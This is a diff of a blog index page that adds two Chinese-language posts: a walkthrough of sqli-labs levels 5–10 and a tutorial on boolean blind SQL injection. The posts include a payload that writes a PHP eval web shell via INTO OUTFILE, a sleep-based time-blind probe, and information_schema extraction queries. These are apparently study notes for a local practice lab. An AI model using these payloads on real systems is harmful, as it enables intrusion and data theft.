@@ -129,12 +129,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">18</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -168,6 +168,194 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/23/%E2%80%9Csqlilab5-10%E2%80%9D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="JIE">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bai">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/10/23/%E2%80%9Csqlilab5-10%E2%80%9D/" class="post-title-link" itemprop="url">“sqlilab5-10”</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-10-23 20:53:51" itemprop="dateCreated datePublished" datetime="2021-10-23T20:53:51+08:00">2021-10-23</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-10-25 10:47:28" itemprop="dateModified" datetime="2021-10-25T10:47:28+08:00">2021-10-25</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="sqlilab5-10"><a href="#sqlilab5-10" class="headerlink" title="sqlilab5-10"></a>sqlilab5-10</h2><h3 id="sqlilab5"><a href="#sqlilab5" class="headerlink" title="sqlilab5"></a>sqlilab5</h3><p>通过尝试可以得出存在注入点，而且为单引号注入</p>
+<p>由于没有回显</p>
+<p>可以通过报错注入、时间盲注、布尔盲注</p>
+<h3 id="sqlilab6"><a href="#sqlilab6" class="headerlink" title="sqlilab6"></a>sqlilab6</h3><p>通过尝试可以得出为双引号注入</p>
+<p>其他与第五题一样</p>
+<h3 id="sqlilab7"><a href="#sqlilab7" class="headerlink" title="sqlilab7"></a>sqlilab7</h3><p>通过尝试得出为((‘id’))的形式，同时通过尝试无法使用报错注入，但是可以使用时间盲注和布尔盲注</p>
+<p>可是通过提示发现要求我们使用<code>outfile</code></p>
+<p>同时可以使用一句话木马，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; into outfile &quot;F:\\WhiteFlie\\PhpStudy20180211\\PHPTutorial\\WWW\\sqli-labs\\ttt.php&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>用中国菜刀连接</p>
+<h3 id="sqlilab8"><a href="#sqlilab8" class="headerlink" title="sqlilab8"></a>sqlilab8</h3><p>通过尝试得出为单引号注入，没有报错回显，所以无法使用报错注入，但是可以用时间盲注和布尔盲注，以及outfile</p>
+<h3 id="sqlilab9"><a href="#sqlilab9" class="headerlink" title="sqlilab9"></a>sqlilab9</h3><p>这一题比较恶心，不管是正确与错误，它的返回值都是一样的</p>
+<p>所以无法用直接看出注入点，</p>
+<p>但是可以用sleep来测试</p>
+<p>?id=1‘ and sleep(5) –+</p>
+<p>如果and前面正常就会延迟5秒显示，反之不会，其他与第八题一样</p>
+<h3 id="sqlilab10"><a href="#sqlilab10" class="headerlink" title="sqlilab10"></a>sqlilab10</h3><p>与第9题基本相同，只有一点不同，就是为双引号注入，其他一样</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/20/sql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="JIE">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bai">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/10/20/sql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">sql布尔盲注</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-10-20 22:14:20" itemprop="dateCreated datePublished" datetime="2021-10-20T22:14:20+08:00">2021-10-20</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-10-21 17:43:07" itemprop="dateModified" datetime="2021-10-21T17:43:07+08:00">2021-10-21</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="sql布尔盲注"><a href="#sql布尔盲注" class="headerlink" title="sql布尔盲注"></a>sql布尔盲注</h2><h3 id="简介及使用场景："><a href="#简介及使用场景：" class="headerlink" title="简介及使用场景："></a>简介及使用场景：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在刚开始接触一个概念时，我们很容易顾名思义，所以在学习盲注之前的一段时间，着实不清楚盲注到底是什么。</span><br><span class="line"></span><br><span class="line">我的理解中盲注的本质就是，在页面无法给我提供回显的时候的一中继续注入的手段。那什么是布尔型盲注呢？在我们输入and 1或者and 0，浏览器返回给我们两个不同的页面，而我们就可以根据返回的页面来判断正确的数据信息。</span><br></pre></td></tr></table></figure>
+
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><h4 id="length函数"><a href="#length函数" class="headerlink" title="length函数"></a>length函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length() 函数的返回值为字符串的字节长度，使用 uft8（UNICODE 的一种变长字符编码，又称万国码）编码字符集时，一个汉字是 3 个字节，一个数字或字母是一个字节。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5xaXVzaHVpLmZ1bi93cC1jb250ZW50L3VwbG9hZHMvMjAxOS8wNi9OSjFJRENRX0dMM000NzRKLnBuZw?x-oss-process=image/format,png"></p>
+<h3 id="substr-函数："><a href="#substr-函数：" class="headerlink" title="substr()函数："></a>substr()函数：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">substr()函数从特定位置开始的字符串返回一个给定长度的子字符串</span><br><span class="line"></span><br><span class="line">substr()函数有三个参数，用法为：substr(str,pos,len)</span><br><span class="line"></span><br><span class="line">str参数代表待截取的字符串</span><br><span class="line"></span><br><span class="line">pos参数代表从什么位置开始截取</span><br><span class="line"></span><br><span class="line">len参数表示字符串截取的长度</span><br><span class="line"></span><br><span class="line">实例：select substr(&#x27;hello&#x27;,1,1)，如下图</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5xaXVzaHVpLmZ1bi93cC1jb250ZW50L3VwbG9hZHMvMjAxOS8wNi9FNVZCQlVHQV9OU1UyRVVDSS5wbmc?x-oss-process=image/format,png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他与substr()函数作用相似的函数有mid()和substring()函数，其用法和substr()函数一致</span><br><span class="line"></span><br><span class="line">实例：`select substring(&#x27;hello&#x27;,1,1)`和`select mid(&#x27;hello&#x27;,1,1)`，则都返回“h”</span><br></pre></td></tr></table></figure>
+
+<h3 id="ascil函数"><a href="#ascil函数" class="headerlink" title="ascil函数"></a>ascil函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ascii()函数可以输出某个字符的ascii码值，ascii码共127个，此处注意ascii函数处理单个字符，如果是字符串则会处理第一个字符</span><br><span class="line"></span><br><span class="line">实例：`select ascii(&#x27;h&#x27;)`，如下图</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5xaXVzaHVpLmZ1bi93cC1jb250ZW50L3VwbG9hZHMvMjAxOS8wNi9pbWFnZS5wbmc?x-oss-process=image/format,png"></p>
+<h3 id="注入实现"><a href="#注入实现" class="headerlink" title="注入实现"></a>注入实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注用到的函数length()、substr()和ascii()函数。</span><br><span class="line"></span><br><span class="line">这里直接用数据库阐述原理，在实际中，如下面的例子注入点为id=1，我们已经无法使用union来直接查询，此处我们需要用到关键字and，我们知道只有and前后的条件都为真的时候，数据库才会输出结果。</span><br></pre></td></tr></table></figure>
+
+<h3 id="判断数据库名的长度："><a href="#判断数据库名的长度：" class="headerlink" title="判断数据库名的长度："></a>判断数据库名的长度：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 首先我们来判断一下数据库的是几个字符，用到length()函数，此处选取的数据库名称为test，如下图所示当判断条件为大于4时，输出为Empty，当判断条件等于四时，输出了我们查询的数据，所以数据库名的字符个数为4。</span><br><span class="line"></span><br><span class="line">实例：select user from test where id=1&#x27; and length((select database()))=8 --+，其中(select database())为子查询，需要加括号，如下图</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/biegaoshi/biegaoshi.github.io/blob/main/img/t6.png?raw=true"></p>
+<p><img src="https://github.com/biegaoshi/biegaoshi.github.io/blob/main/img/t7.png?raw=true"></p>
+<h3 id="猜解数据库名："><a href="#猜解数据库名：" class="headerlink" title="猜解数据库名："></a>猜解数据库名：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们已经知道了数据库名是四个字符，接下来我们可以使用substr()函数对数据库名的字符一个个截取。在通过ascii()函数判断字符的ascii码值,第一个字符的ascii码值为116，第二个为101，同养的步骤，第三个为115，第四个为116，然后和ascii码表比对，发现数据库名为test</span><br><span class="line"></span><br><span class="line">实例：select * from my1 where id=1 and ascii(substr((select database()),1,1))=98，如下图</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/biegaoshi/biegaoshi.github.io/blob/main/img/t8.png?raw=true"></p>
+<h3 id="猜解表名："><a href="#猜解表名：" class="headerlink" title="猜解表名："></a>猜解表名：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">表名我们可以根据系统自带库information_schema进行查询，同理需要用到子查询，此处用到group_concat()函数拼接字符串，在这里可以把查到的数据表名通过逗号拼接起来，先猜解一下拼接的字符串长度，我们在把字符串一个个截取，最后得到一个数据表为test</span><br><span class="line"></span><br><span class="line">实例： select * from my1 where id=1 and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=6，如下图</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/biegaoshi/biegaoshi.github.io/blob/main/img/t9.png?raw=true"></p>
+<h3 id="猜解字段："><a href="#猜解字段：" class="headerlink" title="猜解字段："></a>猜解字段：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">字段的猜解，我们也需要用到系统自带库的columns表，用到的函数和猜解数据库名一致，分别是：length()、substr()、ascii()函数，最后得出有三个字段分别为：id、user和pw</span><br><span class="line"></span><br><span class="line">实例：select user from test where id=1 and length((select group_concat(column_name) from information_schema.columns where table_name=&#x27;test&#x27; and table_schema=database()))=10</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>猜解数据：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表中数据的猜解，与上述方法类似，此处不再赘述</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -291,7 +479,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-10-27 18:57:12" itemprop="dateModified" datetime="2021-10-27T18:57:12+08:00">2021-10-27</time>
+        <time title="修改时间：2021-11-15 16:27:28" itemprop="dateModified" datetime="2021-11-15T16:27:28+08:00">2021-11-15</time>
       </span>
 
   
